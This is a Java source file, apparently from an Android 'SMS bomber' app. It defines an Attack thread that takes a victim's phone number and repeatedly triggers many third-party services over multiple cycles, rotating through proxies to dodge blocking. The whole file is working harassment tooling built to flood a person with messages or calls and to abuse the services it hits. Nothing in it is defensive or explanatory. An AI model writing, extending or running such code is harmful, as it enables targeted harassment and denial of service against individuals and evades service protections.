package com.dm.bomber.bomber;

import android.util.Log;

import com.dm.bomber.services.Service;

import org.jetbrains.annotations.NotNull;

import java.net.Proxy;
import java.util.List;
import java.util.concurrent.CountDownLatch;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Attack extends Thread {
    private static final String TAG = "Attack";

    private final Callback callback;
    private final String phoneCode;
    private final String phone;
    private final int numberOfCycles;
    private final List<Proxy> proxies;

    private int progress = 0;

    private CountDownLatch tasks;

    private static final OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
            .addInterceptor(chain -> {
                Request request = chain.request();
                Log.v(TAG, String.format("Sending request %s", request.url()));

                Response response = chain.proceed(request);
                Log.v(TAG, String.format("Received response for %s with status code %s",
                        response.request().url(), response.code()));

                return response;
            });

    public Attack(Callback callback, String phoneCode, String phone, int cycles, List<Proxy> proxies) {
        super(phone);

        this.phoneCode = phoneCode;
        this.phone = phone;
        this.callback = callback;
        this.proxies = proxies;

        numberOfCycles = cycles;
    }

    @Override
    public void run() {
        List<Service> usableServices = Bomber.getUsableServices(phoneCode.isEmpty() ? 0 : Integer.parseInt(phoneCode));

        callback.onAttackStart(usableServices.size(), numberOfCycles);
        Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));

        clientBuilder.proxy(null);

        try {
            for (int cycle = 0; cycle < numberOfCycles; cycle++) {
                if (!proxies.isEmpty())
                    clientBuilder.proxy(proxies.get(cycle % proxies.size()));

                OkHttpClient client = clientBuilder.build();

                Log.i(TAG, String.format("Started cycle %s", cycle));
                tasks = new CountDownLatch(usableServices.size());

                for (Service service : usableServices) {
                    service.prepare(phoneCode, phone);
                    service.run(client, new com.dm.bomber.services.Callback() {
                        @Override
                        public void onError(Exception e) {
                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
                            tasks.countDown();
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                        service.getClass().getName(), response.code()));
                            }

                            tasks.countDown();
                            callback.onProgressChange(progress++);
                        }
                    });
                }

                try {
                    tasks.await();
                } catch (InterruptedException e) {
                    break;
                }
            }

            callback.onAttackEnd(true);
        } catch (StringIndexOutOfBoundsException e) {
            Log.i(TAG, "Invalid number format");
            callback.onAttackEnd(false);
        } finally {
            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
        }
    }
}
